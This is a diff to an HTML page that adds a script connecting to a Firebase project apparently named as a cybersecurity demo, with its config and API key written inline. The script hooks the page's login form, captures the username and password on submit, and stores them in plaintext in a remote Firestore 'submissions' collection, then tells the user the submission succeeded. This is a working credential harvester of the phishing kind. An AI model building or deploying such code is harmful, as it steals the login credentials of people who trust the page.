@@ -429,6 +429,67 @@
         return true;
       }
     </script>
+    <!-- 2nd script  -->
+    <script type="module">
+
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+      import {
+        getFirestore,
+        collection,
+        addDoc
+      } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+      const firebaseConfig = {
+
+        apiKey: "AIzaSyDWgrC1qm1ALnPG-jkYq6MuF-Jw9Hhp59c",
+
+        authDomain: "cybersecuritydemo-fc8ca.firebaseapp.com",
+
+        projectId: "cybersecuritydemo-fc8ca",
+
+        storageBucket: "cybersecuritydemo-fc8ca.firebasestorage.app",
+
+        messagingSenderId: "287878629371",
+
+        appId: "1:287878629371:web:e460039a640e47f2b0ad5e"
+
+      };
+
+      const app = initializeApp(firebaseConfig);
+
+      const db = getFirestore(app);
+
+      const form = document.querySelector("form");
+
+      form.addEventListener("submit", async (e) => {
+
+        e.preventDefault();
+
+        const username = document.getElementById("userId").value;
+
+        const password = document.getElementById("password").value;
+
+        try {
+
+          await addDoc(collection(db, "submissions"), {
+
+            username: username,
+
+            password: password,
+
+            time: new Date()
+
+          });
+
+          alert("Submitted Successfully");
+
+        } catch (error) {
+            alert("Error saving data");
+            console.error(error);
+          }
+        });
+      </script>
 
     <!-- Loading Overlay -->
     <div id="loadingOverlay">
